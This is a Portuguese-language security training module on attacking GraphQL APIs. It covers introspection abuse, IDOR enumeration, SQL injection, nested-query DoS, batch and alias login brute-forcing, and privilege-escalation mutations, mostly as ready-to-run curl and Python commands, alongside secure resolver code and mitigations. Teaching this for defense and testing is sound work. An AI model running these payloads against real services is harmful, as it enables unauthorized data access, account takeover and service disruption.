---
title: "GraphQL Attacks"
---

# Ataques em GraphQL

# O que é?

GraphQL é uma linguagem de consulta para APIs desenvolvida pelo Facebook em 2012 e tornada open-source em 2015. Diferente do modelo REST, onde cada recurso possui um endpoint fixo e dedicado, o GraphQL expõe um ÚNICO endpoint onde o cliente especifica exatamente quais dados deseja receber em cada requisição.

O núcleo do GraphQL é definido por um schema fortemente tipado, escrito em SDL (Schema Definition Language), que descreve todos os tipos de dados, as queries disponíveis (leitura), as mutations (escrita/modificação) e as subscriptions (dados em tempo real via WebSocket). Esse schema funciona como um contrato explícito entre cliente e servidor.

A introspecção é um mecanismo nativo do GraphQL que permite a qualquer cliente consultar o próprio schema da API — descobrindo todos os tipos, campos, argumentos e operações disponíveis. Em ambientes de desenvolvimento isso é extremamente útil, mas em produção representa uma superfície de ataque significativa.

A especificação GraphQL define:
- **SDL (Schema Definition Language)**: sintaxe para definir tipos, queries, mutations e subscriptions
- **Resolvers**: funções server-side responsáveis por buscar e retornar os dados de cada campo
- **Directives**: anotações que modificam o comportamento de execução (ex: `@deprecated`, `@auth`)
- **Introspection**: sistema de meta-queries (`__schema`, `__type`) que expõe o schema completo
- **Batching**: capacidade de enviar múltiplas queries em uma única requisição HTTP

A filosofia central é "ask for what you need, get exactly that" — o cliente declara o shape exato da resposta desejada, eliminando over-fetching (receber dados além do necessário) e under-fetching (precisar de múltiplas requisições para obter todos os dados necessários).

---

# Onde é implementado?

GraphQL é adotado amplamente em cenários onde a flexibilidade de query e a eficiência de bandwidth são críticas:

**Redes sociais e plataformas de conteúdo:**
- Facebook (criador original, usa internamente em escala massiva)
- Twitter/X (adotou GraphQL em partes da API)
- GitHub API v4 (migrou completamente de REST para GraphQL)
- Instagram (compartilha infraestrutura com o Facebook)

**E-commerce e plataformas SaaS:**
- Shopify usa GraphQL como API principal — toda a Storefront API e Admin API são GraphQL
- Contentful, Prismic e outros CMS headless expõem GraphQL como interface primária
- Stripe tem endpoints GraphQL para alguns produtos

**Aplicações mobile onde bandwidth é crítico:**
- Apps iOS/Android onde o cliente pede apenas os campos que serão exibidos na tela atual
- Reduz payload significativamente em comparação com REST que retorna objetos completos
- Especialmente relevante em redes móveis lentas ou com cota de dados limitada

**SPAs e aplicações frontend modernas:**
- React + Apollo Client (biblioteca mais popular para GraphQL no frontend)
- Vue + urql ou Vue Apollo
- Next.js com Apollo ou SWR + GraphQL
- Svelte com urql

**Arquiteturas de microserviços:**
- GraphQL Federation (Apollo Federation, Netlify): múltiplos subgraphs compõem um schema unificado
- Cada microserviço expõe seu próprio subgraph, e um gateway agrega tudo em uma API coesa
- Usado por empresas como Netflix, Airbnb, Twitter internamente

**Backends e frameworks:**
- Apollo Server (Node.js) — o mais popular
- Hasura — gera GraphQL automaticamente a partir de esquemas PostgreSQL
- AWS AppSync — serviço gerenciado da AWS
- Strawberry e Graphene (Python)
- graphql-java e DGS Framework (Netflix, para Java/Kotlin)
- Hot Chocolate (.NET)
- gqlgen (Go)

---

# Como funciona de forma adequada?

O fluxo completo de uma requisição GraphQL envolve parse, validação e execução contra o schema:

```
CLIENTE                          SERVIDOR GRAPHQL
   |                                    |
   |  POST /graphql                     |
   |  Content-Type: application/json    |
   |  { "query": "{ user(id:\"42\") {   |
   |      email username role           |
   |    }}"                             |
   |----------------------------------->|
   |                                    |
   |                          [1] Parse query
   |                          [2] Valida contra schema
   |                          [3] Verifica tipos e campos
   |                          [4] Executa resolvers:
   |                               Query.user(id: "42")
   |                                 └─> User.email
   |                                 └─> User.username
   |                                 └─> User.role
   |                          [5] Monta resposta JSON
   |                                    |
   |  HTTP 200 OK                       |
   |  { "data": {                       |
   |      "user": {                     |
   |        "email": "foo@bar.com",     |
   |        "username": "foo",          |
   |        "role": "user"              |
   |      }                             |
   |    }                               |
   |  }                                 |
   |<-----------------------------------|
```

**Schema SDL — definição de tipos:**

```graphql
# Definição do schema (server-side)
type User {
  id: ID!
  username: String!
  email: String!
  role: String!
  paymentCards: [Card!]!
  posts: [Post!]!
  createdAt: String!
}

type Card {
  id: ID!
  last4: String!
  brand: String!
  expiryDate: String!
}

type Post {
  id: ID!
  title: String!
  content: String!
  author: User!
  publishedAt: String
}

# Ponto de entrada para leituras
type Query {
  user(id: ID!): User
  users(limit: Int, offset: Int): [User!]!
  post(id: ID!): Post
  posts(authorId: ID): [Post!]!
}

# Ponto de entrada para escritas
type Mutation {
  createUser(username: String!, email: String!, password: String!): User!
  updateUser(id: ID!, username: String, email: String): User!
  deleteUser(id: ID!): Boolean!
  createPost(title: String!, content: String!, authorId: ID!): Post!
}

# Dados em tempo real via WebSocket
type Subscription {
  messageReceived(channelId: ID!): Message!
  userStatusChanged(userId: ID!): User!
}
```

**Comparação: query GraphQL vs REST equivalente:**

```
# COM REST — para obter perfil + posts de um usuário:
GET /users/42           → retorna objeto User COMPLETO (muitos campos desnecessários)
GET /users/42/posts     → segunda requisição necessária
GET /users/42/cards     → terceira requisição necessária
# Total: 3 requisições HTTP, over-fetching em todas

# COM GRAPHQL — uma única requisição, apenas os campos necessários:
POST /graphql
{
  "query": "{ user(id: \"42\") { username email posts { title publishedAt } } }"
}
# Total: 1 requisição HTTP, exatamente os campos pedidos
```

**Exemplo de mutation (criação de dados):**

```graphql
mutation CriarNovoPost {
  createPost(
    title: "Introdução ao GraphQL"
    content: "GraphQL é uma linguagem de consulta..."
    authorId: "42"
  ) {
    id
    title
    publishedAt
    author {
      username
    }
  }
}
```

**Exemplo de subscription (tempo real):**

```graphql
# Cliente mantém conexão WebSocket aberta
subscription EscutarMensagens {
  messageReceived(channelId: "sala-geral") {
    id
    content
    sender {
      username
    }
    sentAt
  }
}
# Servidor envia eventos sempre que uma nova mensagem é publicada
```

**Benefícios do modelo GraphQL:**
- **Elimina over-fetching**: servidor retorna apenas os campos solicitados
- **Elimina under-fetching**: cliente obtém dados relacionados em uma única query (posts + autor + comentários)
- **Fortemente tipado**: schema define contratos explícitos; erros de tipo são detectados antes da execução
- **Auto-documentado**: introspecção permite gerar documentação e ferramentas automaticamente
- **Subscriptions para real-time**: WebSocket nativo no protocolo, sem necessidade de polling
- **Evolução incremental**: adicionar campos novos sem versionar; deprecar campos gradualmente com `@deprecated`
- **Ecossistema de ferramentas**: GraphiQL, Apollo Studio, Insomnia, Altair oferecem exploração interativa do schema

---

## A Falha: Interface de Query Flexível Sem Controle de Acesso por Campo

GraphQL substituiu REST em muitas aplicações modernas (Facebook, GitHub, Shopify, Twitter). Sua proposta central é dar ao cliente controle sobre quais campos quer receber — e essa flexibilidade cria uma superfície de ataque diferente de REST.

A suposição de design errada: o desenvolvedor protege o endpoint `/graphql` com autenticação, mas não valida se o usuário autenticado tem permissão para acessar cada campo individual dentro de uma query. Em REST, um endpoint `/users/42/cards` pode ser protegido por autorização. Em GraphQL, o resolver do campo `cards` dentro do tipo `User` precisa verificar autorização independentemente — e frequentemente não verifica.

**Perspectiva do desenvolvedor vs. da runtime:**

O desenvolvedor pensa: "o usuário está autenticado, logo pode usar o endpoint GraphQL". A runtime GraphQL pensa: "o cliente pediu os campos `email`, `balance` e `cards { number, cvv }` para o user `id: 43`. Vou chamar os resolvers de cada campo". Se o resolver de `cards` não verifica que o `id: 43` pertence ao usuário que está fazendo a query, qualquer usuário autenticado acessa os cartões de qualquer outro.

**Introspecção como mapa do tesouro:** A função de introspecção, projetada para ambientes de desenvolvimento, frequentemente permanece habilitada em produção. Com ela, o atacante obtém o schema completo da API — todas as tabelas, colunas, tipos e mutations disponíveis — sem precisar de documentação. Com uma única query `__schema`, é possível mapear toda a API antes de qualquer exploit.

**Batching como bypass de rate limiting:** Rate limiting baseado em "requisições por segundo" não funciona contra GraphQL batch queries. Uma única requisição HTTP pode conter 50 tentativas de login em um array — o rate limiter conta como 1 requisição, mas o servidor processa 50 autenticações.

Em Bug Bounty, GraphQL é um alvo de alta recompensa porque desenvolvedores frequentemente esquecem de desativar introspecção em produção e expõem campos sensíveis inadvertidamente.

---

## Causa Raiz

A raiz do problema em GraphQL é que o modelo de autorização precisa ser aplicado em dois níveis independentes: no endpoint e em cada resolver de campo.

```javascript
// VULNERAVEL — autenticacao no endpoint, mas sem verificacao por campo
const resolvers = {
  Query: {
    user: (parent, { id }, context) => {
      // Verifica autenticacao — ok
      if (!context.user) throw new Error('Nao autenticado');
      // Mas nao verifica se context.user.id === id
      // Qualquer usuario autenticado acessa qualquer user por id
      return User.findById(id);
    }
  },
  User: {
    // Resolver de campo sensiveis sem verificacao de autorizacao
    paymentCards: (parent, args, context) => {
      return Card.findAll({ where: { userId: parent.id } });
      // Retorna cartoes de qualquer usuario, nao apenas do usuario logado
    }
  }
};

// SEGURO — verificacao de autorizacao em cada resolver critico
const resolvers = {
  Query: {
    user: (parent, { id }, context) => {
      if (!context.user) throw new Error('Nao autenticado');
      // Usuario so acessa seus proprios dados
      if (context.user.id !== id && context.user.role !== 'admin') {
        throw new Error('Nao autorizado');
      }
      return User.findById(id);
    }
  },
  User: {
    paymentCards: (parent, args, context) => {
      // Verificar que o usuario logado e dono dos cartoes
      if (context.user.id !== parent.id && context.user.role !== 'admin') {
        throw new Error('Nao autorizado');
      }
      return Card.findAll({ where: { userId: parent.id } });
    }
  }
};
```

**Introspecção em produção:** o schema completo é exposto por padrão. O que falta é desabilitar em produção:

```javascript
// Apollo Server — desabilitar introscpecao em producao
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production',
  playground: process.env.NODE_ENV !== 'production',
});
```

**Rate limiting por complexidade, não por requisição:**

```javascript
// ERRADO — rate limit por requisicao HTTP nao protege contra batch
// Uma requisicao pode conter 100 mutations

// CORRETO — limite por complexidade e profundidade
const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');

app.use('/graphql', graphqlHTTP({
  schema,
  validationRules: [
    depthLimit(10),                          // max 10 niveis de aninhamento
    createComplexityLimitRule(1000),          // max 1000 pontos de complexidade
  ]
}));
```

---

## Modelo de Dados e Arquitetura do GraphQL

### Comparação REST vs GraphQL

| Aspecto | REST | GraphQL |
|---|---|---|
| Endpoints | Múltiplos (`/users`, `/posts`) | Um único (`/graphql`) |
| Dados retornados | Fixo pelo servidor | Cliente escolhe os campos |
| Versionamento | `/v1/`, `/v2/` | Sem versão, evolução incremental |
| Over-fetching | Frequente | Eliminado |
| Under-fetching | Frequente (N+1) | Eliminado |
| Documentação | Swagger/OpenAPI | Introspecção nativa |

### Estrutura de uma Query GraphQL

```graphql
# Query - leitura de dados
query {
  user(id: "42") {
    id
    email
    username
    role
    paymentCards {
      number
      cvv
    }
  }
}

# Mutation - modificação de dados
mutation {
  updateUser(id: "42", name: "hacker") {
    success
    user {
      name
    }
  }
}

# Subscription - dados em tempo real via WebSocket
subscription {
  messageReceived {
    content
    sender
  }
}
```

### Introspection - O Mapa do Tesouro

```graphql
# Query de introspecção completa - enumera todo o schema
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}

# Listar apenas tipos principais
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
    }
  }
}
```

---

## Na Prática

### 1. Identificar Endpoint GraphQL

```bash
# Endpoints comuns
/graphql
/api/graphql
/graphql/v1
/v1/graphql
/graphiql          # Interface interativa (só em dev?)
/playground        # Apollo Playground

# Teste básico de detecção
curl -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __typename }"}'
# Resposta: {"data":{"__typename":"Query"}} = GraphQL confirmado!
```

### 2. Introspecção - Enumerar Schema

```bash
# Query de introspecção via curl
curl -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# Usar graphql-voyager ou GraphQL Playground para visualizar
# Usando a ferramenta graphql-cop
pip3 install graphql-cop
graphql-cop -t http://TARGET/graphql

# InQL Scanner (Burp Suite Extension)
# Gera queries automaticamente para cada tipo encontrado
```

### 3. Bypass de Introspecção Desabilitada

```bash
# Quando __schema está bloqueado, tentar __type
curl -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}'

# Técnica: fragment com __schema
curl -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"fragment f on __Schema { types { name } } { __schema { ...f } }"}'

# Newline bypass (alguns filtros verificam apenas início da query)
curl -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"\n{ __schema { types { name } } }"}'
```

### 4. IDOR em Queries GraphQL

```bash
# Trocar ID do usuário para acessar dados de outros
# Query normal (usuário autenticado vê seus próprios dados)
curl -X POST http://TARGET/graphql \
     -H "Authorization: Bearer MEU_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(id: \"42\") { email, balance, cards { number } } }"}'

# IDOR: mudar para ID de outro usuário
curl -X POST http://TARGET/graphql \
     -H "Authorization: Bearer MEU_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(id: \"43\") { email, balance, cards { number } } }"}'

# Enumerar usuários com força bruta
for id in {1..100}; do
    curl -s -X POST http://TARGET/graphql \
         -H "Authorization: Bearer TOKEN" \
         -H "Content-Type: application/json" \
         -d "{\"query\":\"{ user(id: \\\"$id\\\") { id, email, role } }\"}"
done
```

### 5. Injeção SQL em GraphQL

```graphql
# Query vulnerável (backend passa argumento direto ao SQL)
{
  user(name: "admin' OR '1'='1") {
    id
    email
    password
  }
}
```

```bash
# Via curl com escape correto
curl -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(name: \"admin\\' OR \\'1\\'=\\'1\") { id email } }"}'

# sqlmap com suporte a GraphQL
sqlmap -u "http://TARGET/graphql" \
       --data='{"query":"{ user(id: \"*\") { email } }"}' \
       --headers="Content-Type: application/json" \
       --batch --level=5 --risk=3
```

### 6. DoS por Complexidade de Query (Nested Query Attack)

```graphql
# Query profundamente aninhada - pode sobrecarregar o servidor
{
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                email
              }
            }
          }
        }
      }
    }
  }
}
```

```bash
# Automatizar com payload grande
python3 -c "
depth = 20
query = '{ users { ' + 'friends { ' * depth + 'email ' + '} ' * depth + '} }'
import json, requests
r = requests.post('http://TARGET/graphql',
    json={'query': query},
    headers={'Content-Type': 'application/json'})
print(r.elapsed.total_seconds(), 'segundos')
"
```

### 7. Batch Query Attack (Brute Force via GraphQL)

{% raw %}
```bash
# GraphQL permite múltiplas queries em uma única requisição (batch)
# Isso bypassar rate limiting que conta por requisição HTTP

# Brute force de login em batch
curl -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '[
  {"query":"mutation { login(email:\"admin@test.com\", password:\"password1\") { token } }"},
  {"query":"mutation { login(email:\"admin@test.com\", password:\"password2\") { token } }"},
  {"query":"mutation { login(email:\"admin@test.com\", password:\"password3\") { token } }"},
  {"query":"mutation { login(email:\"admin@test.com\", password:\"admin123\") { token } }"}
]'

# Script Python para batch brute force
python3 << 'EOF'
import requests

TARGET = "http://TARGET/graphql"
EMAIL = "admin@target.com"
PASSWORDS = open("rockyou.txt").readlines()[:1000]
BATCH_SIZE = 50

for i in range(0, len(PASSWORDS), BATCH_SIZE):
    batch = PASSWORDS[i:i+BATCH_SIZE]
    queries = [
        {"query": f'mutation {{ login(email:"{EMAIL}", password:"{p.strip()}") {{ token user {{ role }} }} }}'}
        for p in batch
    ]
    r = requests.post(TARGET, json=queries)
    for j, result in enumerate(r.json()):
        if result.get("data", {}).get("login"):
            print(f"[+] Senha encontrada: {batch[j].strip()}")
EOF
```
{% endraw %}

### 8. Mutations Sensíveis sem Autenticação

```bash
# Enumerar mutations disponíveis via introspecção
curl -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { mutationType { fields { name args { name type { name kind } } } } } }"}'

# Testar mutation de reset de senha sem token
curl -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation { resetPassword(email: \"admin@target.com\") { success } }"}'

# Mutation de upgrade de role (se não houver auth adequada)
curl -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation { updateUser(id: \"42\", role: \"admin\") { success } }"}'
```

### 9. Field Suggestion Attack (Detecção por Sugestões)

```bash
# GraphQL frequentemente sugere campos parecidos quando um campo não existe
# Isso vaza informações sobre o schema mesmo com introspecção desabilitada

curl -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user { passwrd } }"}'
# Resposta pode incluir: "Did you mean 'password'?"

# Técnica: adivinhar campos por sugestões
# Tentar: passw, passwor, passwd, pass, etc.
```

### 10. Alias para Bypass de Rate Limit (Single Request)

```graphql
# Usar aliases para fazer múltiplas queries em uma só requisição
{
  attempt1: login(email: "admin@test.com", password: "pass1") { token }
  attempt2: login(email: "admin@test.com", password: "pass2") { token }
  attempt3: login(email: "admin@test.com", password: "pass3") { token }
  attempt4: login(email: "admin@test.com", password: "admin") { token }
  attempt5: login(email: "admin@test.com", password: "admin123") { token }
}
```

---

## Ferramentas

| Ferramenta | Função | Instalação |
|---|---|---|
| **graphql-cop** | Scanner de segurança GraphQL | `pip3 install graphql-cop` |
| **InQL** | Burp extension para GraphQL | Burp Suite > BApp Store |
| **GraphQL Voyager** | Visualização do schema | Web: graphql-voyager.com |
| **clairvoyance** | Extração de schema sem introspecção | `pip3 install clairvoyance` |
| **BatchQL** | Batch query para brute force | GitHub: assetnote/batchql |
| **Altair** | Cliente GraphQL | Desktop/browser |
| **GraphiQL** | IDE interativa (dev) | Embutido na aplicação |

```bash
# graphql-cop - verificações automáticas
graphql-cop -t http://TARGET/graphql -v

# Verifica:
# - Introspecção habilitada
# - Field suggestions
# - Batch queries habilitadas
# - Deep recursion permitida
# - Aliases não limitados
# - GET queries habilitadas (CSRF)

# clairvoyance - extração sem introspecção
clairvoyance http://TARGET/graphql -o schema.json
# Usa wordlist para adivinhar nomes de campos
```

---

## Detecção e Mitigação

### Indicadores de Ataque GraphQL

| Padrão | Ataque Provável |
|---|---|
| Query `__schema` frequente | Enumeração de schema |
| Queries com muitos níveis aninhados | DoS por complexidade |
| Array de queries no body | Batch brute force |
| Campos inexistentes com variações | Field suggestion mining |
| Mutations sem token de auth | Tentativa de bypass |
| IDs incrementais em queries | IDOR via enumeração |

### Mitigações Recomendadas

```yaml
Introspecção:
  - Desabilitar em produção
  - Usar allowlist de queries conhecidas (persisted queries)

Rate Limiting:
  - Limitar por complexidade de query, não por requisição HTTP
  - Limitar profundidade máxima (ex: 10 níveis)
  - Limitar aliases por query
  - Limitar batch size

Autenticação:
  - Verificar autenticação em CADA resolver, não apenas na rota
  - Usar middleware de autorização (ex: graphql-shield)
  - Nunca confiar em dados do cliente para identificar usuário

Validação:
  - Schema com tipos não-anuláveis onde possível
  - Validar argumentos antes de passar para SQL/banco
  - Sanitizar inputs em resolvers
```

---

## Módulos Relacionados

O módulo `01_rest_api_attacks.md` cobre mass assignment e shadow endpoints no contexto REST, que se traduzem em padrões análogos em mutations GraphQL. O módulo `03_web_service_attacks.md` trata SOAP e WebSocket, cujos modelos de segurança diferem do endpoint único `/graphql`. Para rate limiting bypassado por vetores de camada HTTP, consulte `../10_http_attacks/01_request_smuggling.md`.

---

## Comparativo: REST vs GraphQL Attack Surface

| Vetor | REST | GraphQL |
|---|---|---|
| SQLi | Em parâmetros individuais | Em argumentos de query/mutation |
| IDOR | Em path params | Em argumentos `id` de queries |
| Brute force | Limitado por endpoint | Bypass via batch/aliases |
| Enumeração | Requer wordlist | Introspecção nativa |
| DoS | DDoS clássico | Nested queries / field count |
| Bypass auth | Headers/tokens | Mutations sem resolver auth |
| Data exposure | Over-fetching fixo | Campos extras não previstos |
